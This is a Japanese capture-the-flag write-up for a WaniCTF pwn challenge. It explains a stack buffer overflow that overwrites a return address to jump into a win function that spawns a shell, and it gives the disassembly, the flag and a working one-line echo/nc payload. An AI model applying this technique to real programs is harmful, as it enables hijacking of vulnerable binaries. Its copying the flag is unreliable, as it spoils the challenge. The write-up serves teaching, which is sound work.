# ret rewrite [pwn]
## 問題文

```
nc ret.wanictf.org 9005
```
+ stackの仕組みを学びましょう。
+ 関数の戻りアドレスはstackに積まれます。
+ "congraturation"が出力されてもスタックのアライメントの問題でwin関数のアドレスから少しずらす必要がある場合があります。
+ `(echo -e "\x11\x11\x11\x11\x11\x11"; cat) | nc ret.wanictf.org 9005`
+ 念のためpwntoolsのサンプルプログラム「pwn05_sample.py」を載せておきました。

### 使用ツール例
+ cat
+ [netcat (nc)](https://github.com/wani-hackase/memo-setup-pwn-utils#netcat)
+ echo
+ [objdump](https://github.com/wani-hackase/memo-setup-pwn-utils#objdump)
+ [pwntools](https://github.com/wani-hackase/memo-setup-pwn-utils#pwntools)


### セキュリティ保護

+ *Partial RELocation ReadOnly (RELRO)*
+ *Stack Smash Protection (SSP)無効*
+ No eXecute bit(NX)有効
+ *Position Independent Executable (PIE)無効*


## FLAG
```
FLAG{1earning-how-return-address-w0rks-on-st4ck}
```
## 解法

スタック上の戻り番地をwin関数に書き換える問題です。

win関数は0x400837なので素直に0x400837に飛ばすと`congraturation!`は出力されるのですが、systemでシェルを起動するときにsegmentation faultで落ちます。
この原因は本来はwin関数がcallで呼ばれることで戻り番地がスタックに積まれるのにretで呼び出されることで戻り番地がスタックに積まれないことでスタックのアライメントが狂ってしまうことです。
これを避けるにはROPでretを一個挟むか、win関数の一番最初の`push rbp`を飛ばすかで行けます。

```
0000000000400837 <win>:
  400837:       55                      push   rbp
  400838:       48 89 e5                mov    rbp,rsp
  40083b:       48 8d 3d 92 02 00 00    lea    rdi,[rip+0x292]        # 400ad4 <_IO_stdin_used+0x4>
  400842:       e8 79 fe ff ff          call   4006c0 <puts@plt>
  400847:       48 8d 3d 96 02 00 00    lea    rdi,[rip+0x296]        # 400ae4 <_IO_stdin_used+0x14>
  40084e:       e8 ad fe ff ff          call   400700 <system@plt>
  400853:       bf 00 00 00 00          mov    edi,0x0
  400858:       e8 e3 fe ff ff          call   400740 <exit@plt>
```

ここでは`push rbp`を飛ばすことを選んだとして戻り番地に0x400838を放り込んで解く方法を載せておきます。
```
(echo -e "AAAAAAAAAAAAAAAAAAAAAA\x38\x08\x40\x00\x00\x00\x00"; cat) | nc ret.wanictf.org 9005
```

### 参考

- [[再掲]Pwnにおけるスタックのアライメント - Qiita](https://qiita.com/ssssssssok1/items/b8ffca6b68149812c335)